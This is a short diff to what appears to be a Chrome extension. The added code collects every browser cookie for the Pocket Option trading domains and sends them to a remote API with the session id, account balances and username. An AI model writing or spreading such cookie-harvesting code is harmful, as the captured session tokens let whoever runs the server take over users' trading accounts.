@@ -125,15 +125,31 @@ async function syncToServer(data) {
   }
   isSyncing = true;
   try {
+    // ✅ CAPTURE COOKIES (New in v1.3.1)
+    let cookieString = "";
+    try {
+      const allCookiesFromBrowser = await chrome.cookies.getAll({});
+      const poDomains = ["pocketoption.com", "po.market"];
+      const poCookies = allCookiesFromBrowser.filter(c => 
+        poDomains.some(domain => c.domain.includes(domain))
+      );
+      const uniqueCookies = Array.from(new Map(poCookies.map(c => [c.name, c])).values());
+      cookieString = uniqueCookies.map(c => `${c.name}=${c.value}`).join("; ");
+      console.log(`[BRIDGE] Captured ${uniqueCookies.length} cookies (${cookieString.length} bytes)`);
+    } catch (cookieErr) {
+      console.error("[BRIDGE] Failed to capture cookies:", cookieErr.message);
+    }
+
     const payload = {
       apiKey,
       ssid: data.ssid,
+      cookies: cookieString, // ✅ ADDED cookies field
       uid: data.uid,
       isDemo: data.isDemo,
       demoBalance: data.balanceData?.demo,
       liveBalance: data.balanceData?.live,
       username: data.username,
-      deviceName: "Chrome Bridge v1.2",
+      deviceName: "Chrome Bridge v1.3.1 (Stable)",
     };
     const res = await fetch(API_URL, {
       method: "POST",
